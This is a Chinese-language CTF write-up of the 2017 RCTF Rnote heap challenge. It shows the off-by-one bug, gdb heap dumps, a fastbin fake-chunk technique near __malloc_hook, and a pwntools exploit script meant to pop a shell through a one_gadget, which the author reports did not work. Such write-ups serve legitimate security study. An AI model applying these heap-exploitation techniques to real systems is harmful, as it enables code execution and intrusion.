---
title: 2017 RCTF Rnote
date: 2017-05-31 09:08:41
tags:
- malloc_hook fastbins
- double free
- off-by-one
- fastbin attack
categories:
- ctf_practice
---

这题做的时候想用fastbin unlink来达到任意地址写，但是无法找到满足条件的size字段，无奈只好放弃~~。

## Challenge
这题漏洞是个off-by-one，但是它没有提供edit功能，所以就不好利用。首先逆向得到个结构体：
<!-- more -->
```c
struct note
{
	long flag;
	long size;
	char title[16];
	char *content;
}
```

漏洞在函数read_title中：
```c
__int64 __fastcall read_title(__int64 a1, unsigned int size)
{
  char buf; // [sp+1Bh] [bp-5h]@2
  int i; // [sp+1Ch] [bp-4h]@1

  for ( i = 0; i <= (signed int)size; ++i )
  {
    if ( read(0, &buf, 1uLL) < 0 )
      exit(1);
    *(_BYTE *)(a1 + i) = buf;
    if ( *(_BYTE *)(i + a1) == 10 )
    {
      *(_BYTE *)(i + a1) = 0;
      return (unsigned int)i;
    }
  }
  return (unsigned int)i;
}
```

## Exploit
赛后，我google了下，找到了一篇[wp](https://drigg3r.gitbooks.io/ctf-writeups-2017/rctf-2017/rnotepwn.html)(仅供参考下思路)参考了一下。

一般来说fastbin总是可以double free的，因为只有freelist上第一个chunk(p)会检测double free，但是当你又free相同size的chunk到freelist上，然后你又可以free p了。但是一般程序都会设置一个标志位来检测chunk有没有被free过，所以又得重新想办法来达到fastbin的double free。我参考的wp使用off-by-one来达到double free，但我的思路就是off-by-one中比较通用的，我用的null byte overflow来将malloc_hook加入fastbin。

这题的巧妙之处是利用free(p)的p指针不需要对齐，从而可以直接在malloc_hook那构造出一个fastbin。这种思路具体可参考这份[wp](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)
```shell
gdb-peda$ x/32gx 0x7f60e38e3740 - 0x20
0x7f60e38e3720 <__memalign_hook>: 0x00007f60e35a5bb0  0x0000000000000000
0x7f60e38e3730 <__realloc_hook>:  0x00007f60e35a5b50  0x0000000000000000
0x7f60e38e3740 <__malloc_hook>: 0x0000000000000000  0x0000000000000000
0x7f60e38e3750: 0x0000000000000000  0x0000000000000000
0x7f60e38e3760 <main_arena>:  0x0000000000000000  0x0000000000000000
0x7f60e38e3770 <main_arena+16>: 0x0000000000000000  0x0000000000000000

gdb-peda$ x/32gx 0x7f60e38e3740 - 0x20 - 3
0x7f60e38e371d: 0x60e35a5bb0000000  0x000000000000007f
0x7f60e38e372d: 0x60e35a5b50000000  0x000000000000007f
0x7f60e38e373d: 0x0000000000000000  0x0000000000000000
0x7f60e38e374d: 0x0000000000000000  0x0000000000000000
0x7f60e38e375d: 0x0000000000000000  0x0000000000000000
0x7f60e38e376d <main_arena+13>: 0x0000000000000000  0x0000000000000000
```
这样直接利用off-by-one null byte来把0x7f60e38e372d加入fastbin中，然后add来得到这个伪造的chunk，并且把malloc_hook覆盖为一个[one_gadget](https://github.com/david942j/one_gadget)的地址，当再次add一个note时就能得到shell。不过当我把0x7f60e38e372d加入fastbin后，却总是在add时崩溃，不知道为什么，无奈只能放弃~~~

我把任意地址加入fastbin的方法还挺巧妙的，过了一个星期我自己都忘了，所以还是记录一下。
首先我们分配堆块temp使其跨越末字节0xf0，差不多就是0x12340到0x12430，在0xf8处填上相应的size。然后我们分配一个fastbin，利用off-by-one null byte覆盖最后一个字节为\x00。然后我们free(p)，此时p已经是被覆盖了，因为我们准备好了size，所以0x123f0被link到fastbin中。然后我们再free堆块temp，然后又add，把temp再次取回来，并且在\x00处填上你的target地址。最后再add一个相应大小的fastbin，因为fastbin中只有0x123f0这一个chunk，所以会把0x12400分配给用户，而fd字段的值即成为新的fastbin中的首个chunk。
```shell
gdb-peda$ x/32gx 0x00cfd1f0
0xcfd1f0: 0x0000000000000000  0x0000000000000071
0xcfd200: 0x0000000000000000  0x0000000000000000 <--free(p)
0xcfd210: 0x0000000000000000  0x0000000000000000
0xcfd220: 0x0000000000000110  0x0000000000000080
0xcfd230: 0x6161616161616161  0x6161616161616161
0xcfd240: 0x6161616161616161  0x6161616161616161
0xcfd250: 0x6161616161616161  0x6161616161616161
0xcfd260: 0x0000000000000000  0x0000000000000071
0xcfd270: 0x0000000000000000  0x0000000000000000
0xcfd280: 0x0000000000000000  0x0000000000000000
0xcfd290: 0x0000000000000000  0x0000000000000000
0xcfd2a0: 0x0000000000000000  0x0000000000020d61
0xcfd2b0: 0x0000000000000000  0x0000000000000000
0xcfd2c0: 0x0000000000000000  0x0000000000000000

gdb-peda$ x/32gx 0x0157a1f0
0x157a1f0:  0x0000000000000000  0x0000000000000071
0x157a200:  0x00007ff81cd4a72d  0x0000000000000000 <--add
0x157a210:  0x0000000000000000  0x0000000000000000
0x157a220:  0x0000000000000110  0x0000000000000081
0x157a230:  0x6161616161616161  0x6161616161616161
0x157a240:  0x6161616161616161  0x6161616161616161
0x157a250:  0x6161616161616161  0x6161616161616161
0x157a260:  0x0000000000000000  0x0000000000000071
0x157a270:  0x0000000000000000  0x0000000000000000
0x157a280:  0x0000000000000000  0x0000000000000000
0x157a290:  0x0000000000000000  0x0000000000000000
0x157a2a0:  0x0000000000000000  0x0000000000020d61
0x157a2b0:  0x0000000000000000  0x0000000000000000

gdb-peda$ p main_arena.fastbinsY 
$1 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x7ff81cd4a72d, 0x0, 0x0, 0x0, 0x0}
```

然而当我再次add时就gg了....

## Exploit
```python
#!/usr/bin python
from pwn import *

debug = 1
if debug:
  p = process('./Rnote')
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
  p = remote('rnote.2017.teamrois.cn', 7777)
  libc = ELF('libc.so.6')

def add(size, title, content):
  p.recvuntil("Your choice: ")
  p.sendline("1")
  p.recvuntil("Please input the note size: ")
  p.sendline(str(size))
  p.recvuntil("Please input the title: ")
  p.send(title)
  p.recvuntil("Please input the content: ")
  p.send(content)

def delete(index):
  p.recvuntil("Your choice: ")
  p.sendline("2")
  p.recvuntil("Which Note do you want to delete: ")
  p.sendline(str(index))
  
def show(index):
  p.recvuntil("Your choice: ")
  p.sendline("3")
  p.recvuntil("Which Note do you want to show: ")
  p.sendline(str(index))
  p.recvuntil("note content: ")
  p.recv(8)

bss = 0x60213c
#first find a way to leak libc
title = 'a' * 15 + '\x0a'
add(0x100, title, 'a') #id 0
add(0x100, title, '\x00' * 0xd8 + '\x71' + '\x00' * 7) #id 1

delete(0)
add(0x100, title, 'a')
show(0)
#ub: 0x3C1760 re: 0x3C3B20
libc_addr = u64(p.recv(8)) - 0x3C1760 - 0x58
#print hex(libc_addr)
print "libc_addr: " + hex(libc_addr)
malloc_hook = libc_addr + 0x3C1740
print "malloc_hook: " + hex(malloc_hook)
one_gadget = libc_addr + 0x4647c
print "one_gadget: " + hex(one_gadget)
print "target: " + hex(malloc_hook + 0xd - 0x20)

#try fastbin unlink
title = 'a' * 16 + '\x0a'
add(0x70, title, 'a' * 0x30 + '\x00' * 8 + '\x71') #id 2

delete(2)
delete(1) 
title = 'a' * 15 + '\x0a'
add(0x100, title, '\x00' * 0xd8 + '\x71' + '\x00' * 7 + p64(malloc_hook + 0xd - 0x20))
add(0x60, title, 'a')
gdb.attach(p)

add(0x60, '\x0a', 'aaa' + p64(one_gadget))
add(0x60, '\x0a', 'aaaa')

p.interactive()
```
脚本没能成功，下次看能不能悟到是哪里出错了....
不知道哪里出错了，我还特地把[babyheap](https://github.com/w0lfzhang/ctfs/tree/master/2017-0ctf)给做了，确实是可以分配malloc_hook那的fake fastbin chunk的，郁闷~~

Rnote2漏洞在于realloc和strncat的组合导致了堆溢出，但是开了PIE无法进行unlink。但是思路还是有很多的，可以覆盖content指针为malloc_hook的地址，然后写入一个one_gadget的地址。
